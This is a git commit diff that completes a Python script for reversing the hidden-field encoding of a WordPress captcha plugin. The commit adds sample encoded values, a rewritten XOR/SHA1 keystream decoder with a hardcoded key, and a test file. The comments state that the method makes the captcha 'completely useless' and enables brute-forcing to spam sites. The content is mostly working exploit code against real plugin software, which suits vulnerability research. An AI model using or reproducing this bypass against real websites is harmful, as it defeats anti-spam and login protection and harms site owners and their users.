925bd069accda1047b3a625c9c55798d314e299b
NikolaiT <nikolai@tschacher.ch>
2013-11-06 22:35:43 +0100

    Completed the reversing script

--- scripts/python/cracking_captcha_plugin/reverse_hidden_fields.py
+++ scripts/python/cracking_captcha_plugin/reverse_hidden_fields.py
@@ -1,11 +1,51 @@
 import requests
 import lxml.html
 import hashlib
-import binascii
+import base64
 
 # A blog post site that needs to have the plugin http://wordpress.org/plugins/captcha/ enabled and 
 # should have a open comment form. This 'attack' works on every form that the plugin supports [E.g. registration,
 # login, ...]. This renders the captcha completely useless.
+
+# Some examples
+
+#Calculation with timestamp: 1383770422 Encoded pWw= is decoded to 3 
+#Calculation with timestamp: 1383773265 Encoded 3Ko= is decoded to 8 
+#Calculation with timestamp: 1383772504 Encoded tNM= is decoded to 6 
+#Calculation with timestamp: 1383770071 Encoded E08r is decoded to 10 
+#Calculation with timestamp: 1383771712 Encoded VEA= is decoded to 0 
+#Calculation with timestamp: 1383770645 Encoded aWPB is decoded to 16 
+#Calculation with timestamp: 1383773392 Encoded MEa7 is decoded to 42 
+#Calculation with timestamp: 1383772030 Encoded 2uA= is decoded to 4 
+#Calculation with timestamp: 1383770004 Encoded lJ8= is decoded to 7 
+#Calculation with timestamp: 1383770859 Encoded KvE= is decoded to 9 
+#Calculation with timestamp: 1383772789 Encoded k1I= is decoded to 7 
+#Calculation with timestamp: 1383773377 Encoded BAE= is decoded to 6 
+#Calculation with timestamp: 1383770038 Encoded /HY= is decoded to 8 
+#Calculation with timestamp: 1383768565 Encoded nmM= is decoded to 5 
+#Calculation with timestamp: 1383765035 Encoded JPA= is decoded to 6 
+#Calculation with timestamp: 1383770354 Encoded 9EZ3 is decoded to 12 
+#Calculation with timestamp: 1383771119 Encoded KX4= is decoded to 1 
+#Calculation with timestamp: 1383773236 Encoded eSc= is decoded to 7 
+#Calculation with timestamp: 1383770716 Encoded J6w= is decoded to 1 
+#Calculation with timestamp: 1383768040 Encoded fUg= is decoded to 1 
+#Calculation with timestamp: 1383773167 Encoded 7Co= is decoded to 6 
+#Calculation with timestamp: 1383770803 Encoded A3k= is decoded to 1 
+#Calculation with timestamp: 1383771047 Encoded J1Q= is decoded to 8 
+#Calculation with timestamp: 1383768079 Encoded fpg= is decoded to 6 
+#Calculation with timestamp: 1383767787 Encoded uR8= is decoded to 2 
+#Calculation with timestamp: 1383773077 Encoded pgg= is decoded to 4 
+#Calculation with timestamp: 1383772657 Encoded KXI= is decoded to 3 
+#Calculation with timestamp: 1383771187 Encoded Ct0= is decoded to 9 
+#Calculation with timestamp: 1383767982 Encoded Y6U= is decoded to 3 
+#Calculation with timestamp: 1383773155 Encoded 9wpu is decoded to 11 
+#Calculation with timestamp: 1383767071 Encoded ejeX is decoded to 27 
+#Calculation with timestamp: 1383772116 Encoded dWyu is decoded to 15
+
+# We see immediately: Any solution higher than 9 has a base64 encoded string
+# without trailing equal sign. In this case the solution is between zero and nine
+# and we can just guess with a hit probability of 1/10th. That's already a high
+# enough probabilty for bruting and thus spamming a site :/
 
 # Author: Nikolai Tschacher
 # Date: 06.11.2013
@@ -29,23 +69,26 @@ def reverse(captcha, key, cptch_time):
     
     d = hashlib.md5()
     d.update(cptch_time)
-    salt = d.hexdigest()
+    salt = d.digest()
     
     slen = len(captcha)
     seq = key
-    gamma = b''
+    gamma = bytearray()
     while len(gamma) < slen:
         sha = hashlib.sha1()
-        sha.update("{}{}{}".format(seq, gamma, salt).encode(encoding="ascii"))
-        seq = binascii.hexlify(bytes(sha.hexdigest(), 'utf-8')) # what the hell?
-        gamma += seq[:8]
-
-    captcha = binascii.a2b_base64(bytes(captcha, 'ascii'));
-    #captcha = captcha ^ gamma; Why bothering? PHP uses for xors on strings just the first char. But this first char is apprantly never used oO
-
-    decoded = captcha[1:]
-
-    return decoded
+        L = bytearray()
+        L.extend(seq)
+        L.extend(gamma)
+        L.extend(salt)
+        sha.update(L)
+        seq = sha.digest()
+        gamma.extend(seq[:8])
+    
+    decoded = []
+    captcha = base64.b64decode(bytes(captcha, 'ascii'));
+    for c, cc in zip(captcha, gamma):
+        decoded.append(chr(c ^ cc))
+    return ''.join(decoded[1:])
     
 if __name__ == '__main__':
         # Obtain post parameters from comment form
@@ -89,7 +132,7 @@ if __name__ == '__main__':
 
         print('[+] Captcha is "{}"'.format(captcha))
         
-        # Try to crickiticrack it :/
+        # Try to crickiticrack it :P [Well we just use the decode() functon]
         solution = reverse(captcha, KEY, time)
         
         
---
+++ scripts/python/cracking_captcha_plugin/t.py
@@ -0,0 +1,5 @@
+# A little test so god will
+
+import reverse_hidden_fields
+
+print('[+] Decoded hidden form value is', reverse_hidden_fields.reverse("oOsi", "bws_3110013", "1383772963"))
